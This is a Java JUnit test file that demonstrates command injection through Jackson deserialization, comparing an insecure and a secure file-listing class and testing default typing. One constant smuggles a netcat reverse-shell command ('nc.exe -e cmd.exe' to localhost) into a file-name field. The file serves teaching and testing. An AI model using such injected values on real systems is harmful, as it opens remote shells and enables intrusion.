package com.tododev.deserializer.jackson.bean;


import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.exc.InvalidDefinitionException;
import org.junit.BeforeClass;
import org.junit.Test;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import static org.junit.Assert.*;

public class AppTest
{
    private final static Logger log = LoggerFactory.getLogger(AppTest.class);
    private final static ObjectMapper objectMapper = new ObjectMapper();

    public final static String JSON_LIST_FILES_RSHELL = "{\"files\":[\"C:\\\\\",\" && C:\\\\Users\\\\Sergio\\\\netcat-1.11\\\\nc.exe -e cmd.exe 127.0.0.1 1234\"]}";
    // {"files":["C:\\"," && C:\\Users\\Sergio\\netcat-1.11\\nc.exe -e cmd.exe 127.0.0.1 1234"]}

    public final static String JSON_LIST_FILES = "{\"files\":[\"C:\\\\\"]}";
    // {"files":["C:\\"]}

    public final static String JSON_SYSUTIL= "{\"fileList\":{\"files\":[\"C:\\\\\"]}}";
    // {"fileList":{"files":["C:\\"]}}

    public final static String JSON_SYSUTIL_DEF_TYP = "{\"fileList\":[\"com.tododev.deserializer.jackson.bean.FileListSecure\",{\"files\":[\"java.util.ArrayList\",[\"C:\\\\\"]]}]}";
    // {"fileList":["com.tododev.deserializer.jackson.bean.FileListSecure",{"files":["java.util.ArrayList",["C:\\"]]}]}

    @Test
    public void deserializeInsecure () throws IOException
    {
        FileListInsecure task = objectMapper.readValue(JSON_LIST_FILES_RSHELL, FileListInsecure.class);
        String output = task.list();
        assertNotNull(output);
        assertTrue(output.length()>0);
        assertTrue(output.contains("<DIR>"));
    }

    @Test
    public void deserializeSecureNoExec () throws IOException
    {
        FileListSecure task = objectMapper.readValue(JSON_LIST_FILES_RSHELL, FileListSecure.class);
        String output = task.list();
        assertNotNull(output);
        assertTrue(output.length()>0);
        assertTrue(output.contains("cannot access ' &&"));
    }

    @Test(expected = InvalidDefinitionException.class)
    public void willNotDeserializeFileListInterface() throws IOException
    {
        FileList task = objectMapper.readValue(JSON_LIST_FILES, FileList.class);
    }

    @Test
    public void deserializeFileListInterfaceImplementation() throws IOException
    {
        FileList task = objectMapper.readValue(JSON_LIST_FILES, FileListSecure.class);
        assertNotNull(task);
        assertTrue(task instanceof FileListSecure);
        assertFalse(task instanceof FileListInsecure);
    }

    @Test(expected = InvalidDefinitionException.class)
    public void willNotDeserializeSysUtils() throws IOException
    {
        SysUtils utils = objectMapper.readValue(JSON_SYSUTIL, SysUtils.class);
    }

    @Test
    public void enablePolimorphismForMapperAndDeserializeSysUtils() throws IOException{
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        SysUtils utils = objectMapper.readValue(JSON_SYSUTIL_DEF_TYP, SysUtils.class);
        assertNotNull(utils);
        assertTrue(utils.getFileList() instanceof FileListSecure);
        assertFalse(utils.getFileList() instanceof FileListInsecure);
    }
}
